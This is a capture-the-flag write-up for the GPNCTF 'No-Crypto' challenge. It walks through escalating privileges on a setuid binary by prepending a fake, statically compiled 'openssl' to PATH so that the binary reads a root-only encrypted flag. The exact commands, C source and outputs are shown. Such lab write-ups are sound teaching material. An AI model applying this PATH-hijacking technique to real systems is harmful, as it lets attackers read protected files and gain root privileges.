# No-Crypto Writeup from L.A.R.S.

## Setup

In this case a local instance is rather useless, so we skip the docker setup.

For the remote instance, we run
```bash
ncat --ssl no-crypto.ctf.kitctf.de 443
```
and enter our team token. We then receive a suggested `ncat` connection command, like:
```bash
ncat --ssl <secret_url>.ctf.kitctf.de 443
```

This should be valid for 29 minutes -- plenty enough time!

## Looking around

### Dockerfile

From the `Dockerfile` we can learn that the flag is stored in `/app/flag`, then encrypted with `encrypt.sh` and deleted.
The `cli` then gets the `u+s` modifier (the `setuid` bit, indicating that it gets executed with the privileges of the owner, in this case `root`).
Finally the permissions on the encrypted flag (`/app/flag.enc`) are set to `700`, indicating that only `root` can access it in any way.

Also `gcc` and `apt` is effectively uninstalled; it's quite hard to see right now why this should affect us.

### encrypt.sh

From `encrypt.sh` we learn that the flag is encoded with `openssl` using the *current* date, whatever that may be, obtained with the command
```bash
date -uIseconds
```

### cli.c

From `cli.c` we can learn that the cli decrypts the flag and notifies if it was successful (and loops otherwise), but never stores the decrypted flag (rather *storing* it in `/dev/null`).
Doesn't seem to helpful.

It is interesting and noteworthy though that it uses an `execvp` call with `openssl` for that though.

### ncat

If we `ncat` into the environment, one of the first things we might notice is that we can't seem to leave with `exit`. This is annoying, but since `CTRL+C` works, it shouldn't trouble us.
In general the environment seems to be weirdly configured, printing some errors:
```bash
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
```
But again, nothing to worry us too much.

As was to be expected from the `Dockerfile`, we find with `ls`:
```bash
ls -lha /app
total 32K
drwxr-xr-x 1 root root   45 May 29 01:31 .
dr-xr-xr-x 1 root root   40 Jun  1 21:57 ..
-rwsr-xr-x 1 root root  17K May 29 01:31 cli
-rw------- 1 root root 1.3K May 28 20:43 cli.c
-rw------- 1 root root   98 May 28 20:43 encrypt.sh
-rwx------ 1 root root   90 May 29 01:31 flag.enc

ls -lha /home
total 0
drwxr-xr-x 1 root root 17 May 30 18:31 .
dr-xr-xr-x 1 root root 40 Jun  1 21:57 ..
drwxr-xr-x 1 ctf  ctf  27 Jun  1 22:00 ctf

ls -lha /home/ctf
total 16K
drwxr-xr-x 1 ctf  ctf    27 Jun  1 22:00 .
drwxr-xr-x 1 root root   17 May 30 18:31 ..
-rw------- 1 ctf  ctf    29 Jun  1 22:09 .bash_history
-rw-r--r-- 1 ctf  ctf   220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ctf  ctf  3.5K Mar 27  2022 .bashrc
-rw-r--r-- 1 ctf  ctf   807 Mar 27  2022 .profile
```

So nohing surprising; especially the missing permissions on `flag.enc` are sad:
```bash
cat flag.enc
cat: flag.enc: Permission denied
```

## Exploiting

### The obvious

So lets first try the obvious way and start `cli`:
```bash
./cli
Guess when I was encrypted ([YYYY]-[MM]-[DD]T[HH]:[MM]:[SS]+[HH]:[MM]): 
```

As we already saw from the source code, we get prompted with the encryption time and can try again if we fail. But of course, we don't want to trial and error, so we figure out the creation time of the encrypted flag, which *should* be the encryption key (or at least *almost*, off by 1 is possible I guess).
So, we run:
```bash
stat flag.enc
  File: flag.enc
  Size: 90        	Blocks: 8          IO Block: 4096   regular file
Device: 200019h/2097177d	Inode: 53318100    Links: 1
Access: (0700/-rwx------)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-05-29 01:31:06.000000000 +0000
Modify: 2024-05-29 01:31:06.000000000 +0000
Change: 2024-05-30 18:32:14.358360852 +0000
 Birth: 2024-05-30 18:32:14.357360844 +0000
```
So the encryption key *should* be `2024-05-29T01:31:06+00:00` (note the format of the encryption key, which is different from the output of `stat`!).

We can give this a try, and indeed it works:
```bash
./cli
Guess when I was encrypted ([YYYY]-[MM]-[DD]T[HH]:[MM]:[SS]+[HH]:[MM]): 2024-05-29T01:31:06+00:00
2024-05-29T01:31:06+00:00
The guessed date is correct!
``` 

Amazing! Yay! But wait -- where is the decrypted flag?
Well, as we saw in the source code, it is stored in `/dev/null`.
That is, it's not stored at all.

### Permissions

So, we know the decryption key and we have the encrypted flag; we should be able to decrypt it our selves, right?
After all, `cli` does nothing special. So lets run the command ourselves, but chose a more sensible storage location for the result:
```bash
openssl enc -d -aes-256-cbc -k 2024-05-29T01:31:06+00:00 -pbkdf2 -base64 -in flag.enc -out flag
Can't open flag.enc for reading, Permission denied
140162746393920:error:0200100D:system library:fopen:Permission denied:../crypto/bio/bss_file.c:69:fopen('flag.enc','r')
140162746393920:error:2006D002:BIO routines:BIO_new_file:system lib:../crypto/bio/bss_file.c:78:
``` 

Almost forgot, we don't have access to `flag.enc`. But why does `cli`? Because it has the dubious `setuid` bit.

Quoting from [linuxconfig](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits):
> When the `setuid` bit is used, the behavior described above it’s modified so that when an executable is launched, it does not run with the privileges of the user who launched it, but with that of the file owner instead. So, for example, if an executable has the `setuid` bit set on it, and it’s owned by root, when launched by a normal user, it will run with root privileges. It should be clear why this represents a potential security risk, if not used correctly.

Yay, a potential security risk!
But now it gets tricky: How do we use the fact that `cli` is run as `root`, even if started by the unprivileged `ctf` user, when `cli` does nothing useful at all?

### What is openssl, after all?

The trick is, to trick `cli` into thinking that `openssl` isn't what it's supposed to be.
That is, if we manage to make `cli` *think* that it's calling `openssl`, whilst in truth it's calling our malicious program that accesses the encrypted flag, that should be the solution.
So how do we do this?

The key lies in `PATH`. `cli` actually doesn't know what `openssl` is (since it's run via a `execvp` call); all it does is checking in the `PATH` where a binary with the name `openssl` might be.
Then it executes the first occurence it can find.

So if we add another executable named `openssl` *before* the other one to the `PATH`, this should do the trick. So we create a file in `/home/ctf` (because we have the permissions there) with the content:
```bash
#!/bin/bash
cat /app/flag.enc
```

(Let's keep it simple first; once we have the file content, decrypting should be trivial.)

Creating that file isn't too easy though, since we don't have any editor. But we can use `echo` for it:
```bash
echo '#!/bin/bash
cat /app/flag.enc' > /home/ctf/openssl
# ...then make it executable
chmod +x /home/ctf/openssl
# ...and pretend it to the PATH
export PATH="/home/ctf:$PATH"
```

Then we can run `cli` and enter nothing as key:
```bash
./cli
Guess when I was encrypted ([YYYY]-[MM]-[DD]T[HH]:[MM]:[SS]+[HH]:[MM]): 

cat: /app/flag.enc: Permission denied
The guessed date is incorrect. Try again!
```

It didn't work! Why did we still get a permission denied??

### What is a program anyway?

To figure out what happened, we can get back to our local machine and create another script (let's call it `script.sh`):
```bash
#!/bin/bash
echo $EUID
```

If we just make it executable and own it by root
```bash
chmod +x script.sh
sudo chown root:root script.sh
```

and run it we still get a `1000`, indicating a non-root user.

However, *even* after setting the `setuid` bit with `sudo chmod u+s script.sh`, we still get a `1000`.
That's because this bit is [ignored on interpreted executables](https://unix.stackexchange.com/a/2910), like a `bash` script.

So *that's* why `gcc` was uninstalled: Otherwise we could've just written a C script and compiled it on the server. C, after all, isn't interpreted.

### base64 magic

Instead we can write a C program locally, compile it locally, encode the file with `base64`, copy the encoded content to the server, decode it and execute it.

Ok, step by step, first the C program. It just needs to print file content, so we can [copy something from online](https://www.geeksforgeeks.org/c-program-print-contents-file/) for that:
```C
#include <stdio.h> 
#include <stdlib.h> // For exit() 
  
int main() 
{ 
    FILE *fptr; 
  
    char filename[100], c; 
  
    printf("Enter the filename to open \n"); 
    scanf("%s", filename); 
  
    // Open file 
    fptr = fopen(filename, "r"); 
    if (fptr == NULL) 
    { 
        printf("Cannot open file \n"); 
        exit(0); 
    } 
  
    // Read contents from file 
    c = fgetc(fptr); 
    while (c != EOF) 
    { 
        printf ("%c", c); 
        c = fgetc(fptr); 
    } 
  
    fclose(fptr); 
    return 0; 
}
```

Compile that with `gcc -static program.c` (static to also include libraries) and we get the executable `a.out`.

Encode that with `base64 a.out` and we get *a lot* of text. Let's copy that to our clipboard.

We can copy that into the server with `echo '<clipboard content>' > /home/ctf/encoded`. This can then be decoded and made executable with
```bash
base64 -d /home/ctf/encoded > /home/ctf/openssl
chmod +x /home/ctf/openssl
```

If we didn't exit the server in the meantime, the `PATH` variable should still be set; otherwise we can set it again.
And indeed, if we now run the `cli` we can retrieve the file content of `flag.enc`:
```bash
./cli
Guess when I was encrypted ([YYYY]-[MM]-[DD]T[HH]:[MM]:[SS]+[HH]:[MM]): 

Enter the filename to open 
/app/flag.enc
<secret encrypted flag>
The guessed date is correct!
```

### Final steps

We can store this secret flag on our local machine (e.g. in `flag.enc` again) and decrypt it:
```bash
openssl enc -d -aes-256-cbc -k 2024-05-29T01:31:06+00:00 -pbkdf2 -base64 -in flag_encoded -out flag
cat flag
GPNCTF{<secret flag content>}
```

**We made it!**
